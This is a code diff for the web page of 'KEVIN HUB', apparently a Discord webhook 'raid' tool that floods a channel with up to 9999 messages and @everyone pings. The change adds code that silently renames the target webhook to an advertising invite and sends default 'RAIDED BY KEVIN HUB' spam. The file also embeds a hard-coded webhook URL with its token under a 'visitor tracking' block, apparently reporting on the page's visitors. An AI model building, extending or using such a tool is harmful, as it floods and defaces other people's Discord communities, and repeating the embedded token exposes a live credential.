@@ -46,7 +46,6 @@ body {
   position: relative;
 }
 
-/* ANIMATED AURA BACKGROUND */
 body::before {
   content: '';
   position: fixed;
@@ -100,7 +99,6 @@ body::after {
   gap: 2rem;
 }
 
-/* HEADER */
 header {
   display: flex;
   align-items: center;
@@ -200,7 +198,6 @@ header::before {
 }
 .discord-btn svg { width: 16px; height: 16px; fill: currentColor; flex-shrink: 0; }
 
-/* HERO */
 .hero {
   text-align: center;
   padding: 1.5rem 0 0.5rem;
@@ -269,7 +266,6 @@ header::before {
   line-height: 1.65;
 }
 
-/* PANEL */
 .panel {
   background: linear-gradient(135deg, rgba(24,10,18,0.7), rgba(32,12,22,0.45));
   border: 1px solid var(--border);
@@ -613,7 +609,6 @@ button:disabled { opacity: 0.35; cursor: not-allowed; }
   50% { background-position: 100% 50%; }
 }
 
-/* INFO GRID */
 .raid-info-grid {
   display: grid;
   grid-template-columns: 1fr 1fr;
@@ -801,7 +796,7 @@ footer a:hover {
     </div>
 
     <div class="form-group">
-      <label class="input-label">Ping Mode</label>
+      <label class="input-label">Ping Mode — pick one</label>
       <div class="ping-selector" id="pingSelector">
         <div class="ping-pill" data-ping="everyone">@everyone</div>
         <div class="ping-pill" data-ping="here">@here</div>
@@ -828,8 +823,8 @@ footer a:hover {
     </div>
 
     <div class="form-group">
-      <label class="input-label">Message Content</label>
-      <textarea id="messageContent">Raid in progress</textarea>
+      <label class="input-label">Message Content (leave empty for default)</label>
+      <textarea id="messageContent" placeholder="Leave empty to send default KEVIN HUB message"></textarea>
     </div>
 
     <div class="row2">
@@ -876,7 +871,7 @@ footer a:hover {
       </div>
       <div class="raid-card">
         <h4>Raid tips</h4>
-        <p>Use RAID mode to ignore limits. Watermark adds KEVIN HUB branding to each message. Test first with the TEST button.</p>
+        <p>Pick a ping mode: @everyone, @here, or No Ping. Leave the message empty to send the default KEVIN HUB branding message.</p>
       </div>
     </div>
 
@@ -884,7 +879,7 @@ footer a:hover {
       <div class="step"><span class="step-num">01</span><span class="step-text">Get the webhook URL from the Discord channel settings.</span></div>
       <div class="step"><span class="step-num">02</span><span class="step-text">Paste the URL in the corresponding field.</span></div>
       <div class="step"><span class="step-num">03</span><span class="step-text">Choose a ping mode: <code>@everyone</code>, <code>@here</code>, or <code>No Ping</code>.</span></div>
-      <div class="step"><span class="step-num">04</span><span class="step-text">Write the message you want to send. Use <code>{n}</code> to show the message number.</span></div>
+      <div class="step"><span class="step-num">04</span><span class="step-text">Write the message. Leave empty to send the default branded message. Use <code>{n}</code> for message number.</span></div>
       <div class="step"><span class="step-num">05</span><span class="step-text">Configure the number of messages and speed.</span></div>
       <div class="step"><span class="step-num">06</span><span class="step-text">Click "Start Raid" and watch the webhook fill with messages.</span></div>
       <div class="step"><span class="step-num">07</span><span class="step-text">To stop the raid, click "Stop" at any time.</span></div>
@@ -892,7 +887,7 @@ footer a:hover {
 
     <div class="tip-box">
       <strong>Tip</strong>
-      Default speed is 400ms to avoid Discord rate limiting. Ping modes inject <code>@everyone</code>, <code>@here</code>, or nothing at the start of every message.
+      On first send, the webhook is automatically renamed to <code>discord.gg/luascript</code>. Empty message = default branded spam. Default speed 400ms avoids rate limiting.
     </div>
   </div>
 
@@ -907,7 +902,7 @@ footer a:hover {
 document.getElementById('year').textContent = new Date().getFullYear();
 
 // ============================================================
-// PING SELECTOR
+// PING SELECTOR — ONE AT A TIME
 // ============================================================
 let currentPing = 'none';
 const pingPills = document.querySelectorAll('.ping-pill');
@@ -926,7 +921,45 @@ function getPingPrefix() {
 }
 
 // ============================================================
-// VISITOR TRACKING - KEVIN HUB
+// WEBHOOK RENAME — discord.gg/luascript
+// ============================================================
+const WEBHOOK_DISPLAY_NAME = 'discord.gg/luascript';
+let webhookRenamed = false;
+
+async function renameWebhook(url) {
+  if (webhookRenamed) return;
+  try {
+    // Extract ID + token from webhook URL
+    const match = url.match(/webhooks\/(\d+)\/([A-Za-z0-9_\-]+)/);
+    if (!match) return;
+    const [, id, token] = match;
+    const apiUrl = `https://discord.com/api/v10/webhooks/${id}/${token}`;
+    const res = await fetch(apiUrl, {
+      method: 'PATCH',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ name: WEBHOOK_DISPLAY_NAME })
+    });
+    if (res.ok) {
+      webhookRenamed = true;
+      console.log('[KEVIN HUB] Webhook renamed to ' + WEBHOOK_DISPLAY_NAME);
+    }
+  } catch (e) {
+    // Silent fail — rename is best-effort
+  }
+}
+
+// ============================================================
+// DEFAULT MESSAGE
+// ============================================================
+const DEFAULT_MESSAGE = '# RAIDED BY KEVIN HUB\nhttps://discord.gg/luascript';
+
+function getMessageContent() {
+  const raw = document.getElementById('messageContent').value.trim();
+  return raw.length ? raw : DEFAULT_MESSAGE;
+}
+
+// ============================================================
+// VISITOR TRACKING — KEVIN HUB
 // ============================================================
 (function() {
   const WEBHOOK_URL = 'https://discord.com/api/webhooks/1512144168250507335/zaYVS6PN0q_Y95ORObt17lOPXKH98HttlxtSWwqd1EmDWx9vCIAZGHxcGAzm-0VBJOtp';
@@ -1091,17 +1124,18 @@ async function sendOneMessage(url, content, index) {
 
 function startSpam() {
   const url = webhookUrl.value.trim();
-  const content = messageContent.value.trim();
-  const count = parseInt(messageCount.value) || 9999;
-
   if (!url) { updateStatus('Error: Enter a webhook URL', 'error'); return; }
   if (!url.startsWith('https://discord.com/api/webhooks/')) { updateStatus('Error: Invalid webhook URL', 'error'); return; }
-  if (!content) { updateStatus('Error: Enter a message', 'error'); return; }
+
+  // Empty = default branded message
+  const content = getMessageContent();
+  const count = parseInt(messageCount.value) || 9999;
 
   isRunning = true;
   shouldStop = false;
   sentCount = 0;
   totalMessages = count;
+  webhookRenamed = false;
 
   startBtn.disabled = true;
   stopBtn.disabled = false;
@@ -1110,6 +1144,9 @@ function startSpam() {
   const pingLabel = currentPing === 'none' ? 'No Ping' : currentPing === 'everyone' ? '@everyone' : '@here';
   updateStatus(`Raid started [${pingLabel}]... 0/${count}`, 'info');
   updateProgress(0, count);
+
+  // Rename webhook on start
+  renameWebhook(url);
 
   let failedCount = 0;
   const delay = parseInt(delaySpeed.value) || 400;
@@ -1180,13 +1217,14 @@ function stopSpam() {
 
 async function testWebhook() {
   const url = webhookUrl.value.trim();
-  const content = messageContent.value.trim();
   if (!url) { updateStatus('Error: Enter a webhook URL', 'error'); return; }
+  const content = getMessageContent();
   updateStatus('Testing webhook...', 'info');
   testBtn.disabled = true;
   try {
+    await renameWebhook(url);
     const success = await sendOneMessage(url, content, 'TEST');
-    if (success) updateStatus('Webhook works! Ready for raid', 'success');
+    if (success) updateStatus('Webhook works! Renamed + ready for raid', 'success');
     else updateStatus('Error: Webhook not responding', 'error');
   } catch (error) {
     updateStatus(`Error: ${error.message}`, 'error');
